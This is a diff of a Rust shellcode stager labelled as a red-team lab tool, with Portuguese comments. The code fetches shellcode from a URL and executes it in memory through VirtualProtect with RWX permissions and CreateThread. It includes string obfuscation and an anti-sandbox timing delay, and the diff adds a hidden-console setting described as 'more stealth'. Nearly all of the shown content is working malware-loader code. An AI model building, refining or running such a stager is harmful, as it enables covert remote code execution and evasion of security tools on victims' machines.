@@ -1,7 +1,9 @@
 // ========================================================
 // rusta-stager/src/main.rs
-// Rust Stager - Lab Red Team 2026 (VERSÃO FINAL FUNCIONANDO)
+// Rust Stager - Lab Red Team 2026 (Versão Melhorada)
 // ========================================================
+#![windows_subsystem = "windows"]  // <-- Remove janela de console (mais stealth)
+
 use clap::Parser;
 use log::{error, info, warn};
 use obfstr::obfstr;
@@ -10,9 +12,9 @@ use reqwest::blocking;
 use std::error::Error;
 use std::time::Duration;
 
-// ==================== WINDOWS API ====================
 use windows::Win32::System::Memory::*;
 use windows::Win32::System::Threading::*;
+
 // ========================================================
 
 #[derive(Parser)]
@@ -24,9 +26,7 @@ struct Args {
 
 #[derive(clap::Subcommand)]
 enum Commands {
-    /// Mostra informações do sistema + anti-VM
     Info,
-    /// Baixa e executa shellcode in-memory
     Execute {
         #[arg(short, long, required = true)]
         url: String,
@@ -60,7 +60,8 @@ fn anti_analysis_check() -> bool {
         return false;
     }
 
-    let delay = rand::thread_rng().gen_range(1200..4500);
+    // Delay anti-timing + anti-sandbox
+    let delay = rand::thread_rng().gen_range(1500..5000);
     std::thread::sleep(Duration::from_millis(delay));
 
     info!("{} Anti-analysis passed", obfstr!("[+]"));
@@ -73,7 +74,7 @@ fn run_info() {
     info!("OS: {}", sysinfo::System::long_os_version().unwrap_or_default());
     info!("CPU Cores: {}", sys.cpus().len());
     info!("RAM Total: {} GB", sys.total_memory() / 1024 / 1024 / 1024);
-    info!("{} Pronto para uso no Lab!", obfstr!("[+]"));
+    info!("{} Pronto!", obfstr!("[+]"));
 }
 
 fn execute_shellcode(url: &str) -> Result<(), Box<dyn Error>> {
@@ -107,18 +108,17 @@ fn execute_shellcode(url: &str) -> Result<(), Box<dyn Error>> {
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
 
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
+        let _ = VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
 
-        // ====================== THREAD CORRIGIDA (windows 0.57) ======================
         let start_routine: LPTHREAD_START_ROUTINE = Some(std::mem::transmute(addr));
 
         let thread = CreateThread(
-            None,                          // lpThreadAttributes
-            0,                             // dwStackSize
-            start_routine,                 // lpStartAddress (Option<fn>)
-            None,                          // lpParameter
-            THREAD_CREATION_FLAGS(0),      // dwCreationFlags
-            None,                          // lpThreadId
+            None,
+            0,
+            start_routine,
+            None,
+            THREAD_CREATION_FLAGS(0),
+            None,
         )
         .map_err(|e| format!("CreateThread falhou: {:?}", e))?;
 
@@ -129,7 +129,6 @@ fn execute_shellcode(url: &str) -> Result<(), Box<dyn Error>> {
 
         info!("{} Shellcode executado in-memory com sucesso!", obfstr!("[+]"));
         WaitForSingleObject(thread, INFINITE);
-        // ============================================================================
     }
 
     Ok(())
